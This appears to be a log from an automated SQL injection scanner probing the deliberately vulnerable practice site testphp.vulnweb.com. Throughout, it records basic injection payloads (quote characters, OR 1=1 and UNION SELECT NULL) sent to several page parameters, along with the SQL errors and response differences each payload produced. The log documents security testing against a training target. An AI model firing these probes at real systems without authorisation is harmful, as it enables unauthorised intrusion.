+2025-11-10 11:19:47,787 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27%29--
+2025-11-10 11:19:47,787 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27%29--
+2025-11-10 11:19:47,788 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%27%29--
+2025-11-10 11:19:48,587 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:48,588 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:48,588 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-10 11:19:49,371 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:19:49,371 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:19:49,372 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1--
+2025-11-10 11:19:50,186 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:19:50,186 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:19:50,190 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+1%3D1--
+2025-11-10 11:19:50,190 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=2
+2025-11-10 11:19:51,936 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27
+2025-11-10 11:19:51,936 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27
+2025-11-10 11:19:51,937 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%27
+2025-11-10 11:19:52,737 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:52,737 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:52,745 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271
+2025-11-10 11:19:53,535 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22
+2025-11-10 11:19:53,535 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22
+2025-11-10 11:19:53,544 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%22
+2025-11-10 11:19:54,335 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:54,335 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:54,341 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%221%22%3D%221
+2025-11-10 11:19:55,147 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%60
+2025-11-10 11:19:55,149 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%60
+2025-11-10 11:19:55,172 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%60
+2025-11-10 11:19:55,971 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27%29--
+2025-11-10 11:19:55,971 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27%29--
+2025-11-10 11:19:55,976 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%27%29--
+2025-11-10 11:19:56,748 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:56,748 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:56,755 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-10 11:19:57,535 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:19:57,535 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:19:57,541 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1--
+2025-11-10 11:19:58,334 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:19:58,335 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:19:58,347 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+1%3D1--
+2025-11-10 11:19:58,348 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=3
+2025-11-10 11:19:59,963 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27
+2025-11-10 11:19:59,963 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27
+2025-11-10 11:19:59,971 INFO: [SQLi-DOM] artist=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%27
+2025-11-10 11:20:00,737 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:00,737 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:00,742 INFO: [SQLi-DOM] artist=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:01,535 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22
+2025-11-10 11:20:01,537 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22
+2025-11-10 11:20:01,544 INFO: [SQLi-DOM] artist=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%22
+2025-11-10 11:20:02,335 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:20:02,337 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:20:02,342 INFO: [SQLi-DOM] artist=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%221%22%3D%221
+2025-11-10 11:20:03,153 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%60
+2025-11-10 11:20:03,153 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%60
+2025-11-10 11:20:03,160 INFO: [SQLi-DOM] artist=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%60
+2025-11-10 11:20:04,092 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27%29--
+2025-11-10 11:20:04,093 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27%29--
+2025-11-10 11:20:04,098 INFO: [SQLi-DOM] artist=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%27%29--
+2025-11-10 11:20:04,911 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:04,912 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:04,914 INFO: [SQLi-DOM] artist=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-10 11:20:05,869 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:20:05,876 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:20:05,881 INFO: [SQLi-DOM] artist=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1--
+2025-11-10 11:20:06,836 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:20:06,837 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:20:06,842 INFO: [SQLi-DOM] artist=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+1%3D1--
+2025-11-10 11:20:06,844 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/?pp=12
+2025-11-10 11:20:15,163 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=1
+2025-11-10 11:20:16,896 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27
+2025-11-10 11:20:16,896 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27
+2025-11-10 11:20:16,899 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%27
+2025-11-10 11:20:17,696 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+%271%27%3D%271
+2025-11-10 11:20:17,698 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+OR+%271%27%3D%271
+2025-11-10 11:20:17,710 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+%271%27%3D%271
+2025-11-10 11:20:18,677 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22
+2025-11-10 11:20:18,678 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22
+2025-11-10 11:20:18,681 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%22
+2025-11-10 11:20:19,649 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+%221%22%3D%221
+2025-11-10 11:20:19,650 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22+OR+%221%22%3D%221
+2025-11-10 11:20:19,653 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+%221%22%3D%221
+2025-11-10 11:20:20,465 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%60
+2025-11-10 11:20:20,465 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%60
+2025-11-10 11:20:20,469 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%60
+2025-11-10 11:20:21,399 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27%29--
+2025-11-10 11:20:21,399 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27%29--
+2025-11-10 11:20:21,403 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%27%29--
+2025-11-10 11:20:22,216 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+UNION+SELECT+NULL--
+2025-11-10 11:20:22,216 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+UNION+SELECT+NULL--
+2025-11-10 11:20:22,217 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%27+UNION+SELECT+NULL--
+2025-11-10 11:20:23,182 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+1%3D1--
+2025-11-10 11:20:23,182 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+OR+1%3D1--
+2025-11-10 11:20:23,183 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+1%3D1--
+2025-11-10 11:20:23,972 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+1%3D1--
+2025-11-10 11:20:23,972 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22+OR+1%3D1--
+2025-11-10 11:20:23,975 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+1%3D1--
+2025-11-10 11:20:23,976 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
+2025-11-10 11:20:26,013 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27
+2025-11-10 11:20:26,013 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27
+2025-11-10 11:20:26,799 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:20:26,799 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:20:27,633 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22
+2025-11-10 11:20:27,633 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22
+2025-11-10 11:20:28,599 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:20:28,599 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:20:29,564 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%60
+2025-11-10 11:20:29,564 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%60
+2025-11-10 11:20:30,382 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27%29--
+2025-11-10 11:20:30,383 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27%29--
+2025-11-10 11:20:31,165 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:20:31,165 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:20:31,965 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+1%3D1--
+2025-11-10 11:20:31,965 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+1%3D1--
+2025-11-10 11:20:32,899 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+1%3D1--
+2025-11-10 11:20:32,899 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+1%3D1--
+2025-11-10 11:20:32,899 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=2
+2025-11-10 11:20:34,656 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27
+2025-11-10 11:20:34,656 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27
+2025-11-10 11:20:34,659 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%27
+2025-11-10 11:20:35,464 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+%271%27%3D%271
+2025-11-10 11:20:35,464 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+OR+%271%27%3D%271
+2025-11-10 11:20:35,465 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+%271%27%3D%271
+2025-11-10 11:20:36,428 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22
+2025-11-10 11:20:36,429 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22
+2025-11-10 11:20:36,431 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%22
+2025-11-10 11:20:37,254 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+%221%22%3D%221
+2025-11-10 11:20:37,254 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22+OR+%221%22%3D%221
+2025-11-10 11:20:37,256 INFO: [SQLi-DOM] pic=" OR "1"="1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+%221%22%3D%221
+2025-11-10 11:20:38,208 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%60
+2025-11-10 11:20:38,208 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%60
+2025-11-10 11:20:38,212 INFO: [SQLi-DOM] pic=` caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%60
+2025-11-10 11:20:39,144 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27%29--
+2025-11-10 11:20:39,144 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27%29--
+2025-11-10 11:20:39,147 INFO: [SQLi-DOM] pic=')-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%27%29--
+2025-11-10 11:20:40,121 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+UNION+SELECT+NULL--
+2025-11-10 11:20:40,121 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+UNION+SELECT+NULL--
+2025-11-10 11:20:40,124 INFO: [SQLi-DOM] pic=' UNION SELECT NULL-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%27+UNION+SELECT+NULL--
+2025-11-10 11:20:41,080 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+1%3D1--
+2025-11-10 11:20:41,080 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+OR+1%3D1--
+2025-11-10 11:20:41,083 INFO: [SQLi-DOM] pic=' OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+1%3D1--
+2025-11-10 11:20:42,024 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+1%3D1--
+2025-11-10 11:20:42,024 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22+OR+1%3D1--
+2025-11-10 11:20:42,027 INFO: [SQLi-DOM] pic=" OR 1=1-- caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+1%3D1--
+2025-11-10 11:20:42,027 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
+2025-11-10 11:20:43,817 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27
+2025-11-10 11:20:43,819 INFO: [SQLi-DOM] file=' caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27
+2025-11-10 11:20:44,605 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:20:44,605 INFO: [SQLi-DOM] file=' OR '1'='1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+%271%27%3D%271
+2025-11-10 11:20:45,414 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22
+2025-11-10 11:20:45,414 INFO: [SQLi-DOM] file=" caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22
+2025-11-10 11:20:46,347 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:20:46,348 INFO: [SQLi-DOM] file=" OR "1"="1 caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+%221%22%3D%221
+2025-11-10 11:20:47,144 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%60
+2025-11-10 11:20:47,144 INFO: [SQLi-DOM] file=` caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%60
+2025-11-10 11:20:47,947 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27%29--
+2025-11-10 11:20:47,947 INFO: [SQLi-DOM] file=')-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27%29--
+2025-11-10 11:20:48,746 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:20:48,746 INFO: [SQLi-DOM] file=' UNION SELECT NULL-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+UNION+SELECT+NULL--
+2025-11-10 11:20:49,577 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+1%3D1--
+2025-11-10 11:20:49,579 INFO: [SQLi-DOM] file=' OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+1%3D1--
+2025-11-10 11:20:50,512 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+1%3D1--
+2025-11-10 11:20:50,513 INFO: [SQLi-DOM] file=" OR 1=1-- caused DOM diff score 0.0 @ http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+1%3D1--
+2025-11-10 11:20:50,513 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=3
+2025-11-10 11:20:52,113 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27
+2025-11-10 11:20:52,113 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27
+2025-11-10 11:20:52,117 INFO: [SQLi-DOM] pic=' caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%27
+2025-11-10 11:20:53,045 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:53,045 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:53,046 INFO: [SQLi-DOM] pic=' OR '1'='1 caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+%271%27%3D%271
+2025-11-10 11:20:53,845 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22
+2025-11-10 11:20:53,845 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22
+2025-11-10 11:20:53,848 INFO: [SQLi-DOM] pic=" caused DOM diff score 0.5357142857142857 @ http://testphp.vulnweb.com/product.php?pic=3%22
+2025-11-10 11:20:54,661 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+%221%22%3D%221
+2025-11-10 11:20:54,661 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22+OR+%221%22%3D%221
